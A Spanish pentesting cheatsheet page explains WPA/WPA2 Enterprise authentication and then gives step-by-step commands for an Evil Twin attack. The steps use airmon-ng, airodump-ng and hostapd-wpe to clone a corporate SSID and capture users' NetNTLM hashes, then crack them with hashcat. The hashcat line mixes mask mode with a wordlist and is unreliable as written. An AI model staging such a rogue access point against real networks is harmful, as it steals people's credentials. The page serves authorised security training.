
# WPA/WPA2 Enterprise

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Cómo funcionan las redes WPA/WPA2 Enterprise:</mark>

1. **Autenticación 802.1X:**
   * La característica clave de WPA/WPA2 Enterprise es la autenticación 802.1X, que es un estándar de la IEEE para el control de acceso a la red.
   * En lugar de utilizar una clave de precompartida (PSK) compartida, cada usuario se autentica individualmente con un servidor de autenticación central.
2. **Servidor de Autenticación:**
   * Para implementar WPA/WPA2 Enterprise, se necesita un servidor de autenticación, que generalmente ejecuta el protocolo RADIUS (Remote Authentication Dial-In User Service).
   * El servidor RADIUS actúa como un intermediario entre los dispositivos de usuario y el sistema de autenticación.
3. **Certificados y EAP (Extensible Authentication Protocol):**
   * La autenticación 802.1X utiliza el protocolo EAP para facilitar la comunicación entre el cliente y el servidor de autenticación.
   * Los usuarios y el servidor de autenticación intercambian certificados digitales para verificar la identidad de ambas partes.
4. **Credenciales de Usuario:**
   * Los usuarios deben proporcionar sus credenciales (como un nombre de usuario y una contraseña) al intentar conectarse a la red.
   * Estas credenciales son verificadas por el servidor RADIUS a través del proceso de autenticación.
5. **Claves Dinámicas:**
   * En lugar de utilizar una clave de red estática, como en el caso de WPA/WPA2 personal, WPA/WPA2 Enterprise genera claves de sesión dinámicas únicas para cada conexión.
   * Esto mejora la seguridad ya que las claves cambian periódicamente, y comprometer una clave no comprometerá todas las comunicaciones futuras.
6. **Desafío-Respuesta:**
   * El proceso de autenticación implica un desafío y una respuesta entre el cliente y el servidor de autenticación. Esto dificulta el acceso no autorizado a la red.
7. **Seguridad Escalada:**
   * WPA2 Enterprise generalmente ofrece una seguridad más sólida que WPA Enterprise, ya que utiliza cifrado AES (Advanced Encryption Standard) en lugar de TKIP (Temporal Key Integrity Protocol).

## <mark style="color:purple;">Ataque Evil Twin</mark>

En este tipo de ataque, un atacante crea una red inalámbrica falsa que parece ser legítima al emular o clonar la configuración de una red Wi-Fi genuina. El nombre "Evil Twin" se refiere al hecho de que la red falsa es una versión maliciosa de la red legítima.

### 1. Instalamos `hostapd-wep`

```bash
sudo apt install hostapd-wpe
```

### 2. Ir a un punto elevado:

O un piso superior en una organización, ya que aumenta el alcance de la señal.

### 3. Iniciamos modo monitor:

```bash
sudo airmon-ng check kill
ifconfig wlan0 down
sudo airmon-ng start wlan0
```

### 4. Iniciamos airodump

Buscamos la red objetivo

```bash
sudo airodump-ng wlan0mon
```

### 5. Creamos la plantilla

Vamos al directorio `/etc/hostapd-wpe` y copiamos el archivo de configuración para hacer nuestra plantilla y tenerlo como backup:

```bash
cd /etc/hostapd-wpe
cp hostapd-wpe.conf plantilla.conf
```

<figure><img src="/files/SNV3rg9Bk1x6dhaUb2lV" alt=""><figcaption></figcaption></figure>

Vamos a editar el archivo `hostapd-wpe.conf`:

<pre class="language-bash"><code class="lang-bash"><strong>sudo gedit hostapd-wpe.conf
</strong>
# Adaptar la interfaz a la que tenemos activa en modo monitor
interface=wlan0

# Poner el SSID que vamos a duplicar de la red objetivo y su channel
ssid=EMPRESA
channel=4
</code></pre>

### 6. Iniciamos el ataque

```bash
sudo hostapd-wpe hostapd-wpe.conf
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED 
```

Cuando un usuario se conecte a la red introduce sus credenciales, y le da un error inesperado que dice que no puede conectarse, y a nosotros nos llegan las credenciales en formato de hash:

<figure><img src="/files/ldYLj4svKUoL962PuW36" alt=""><figcaption></figcaption></figure>

Podríamos descifrar este hash NTLM con john o Hashcat fácilmente:

```bash
hashcat -m 5500 -a 3 hash /usr/share/Wordlists/rockyou.txt
```

{% content-ref url="/pages/TRZKCtXVALGrKxJ5dmfE" %}
[Cracking de Contraseñas](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/cracking-de-contrasenas.md)
{% endcontent-ref %}
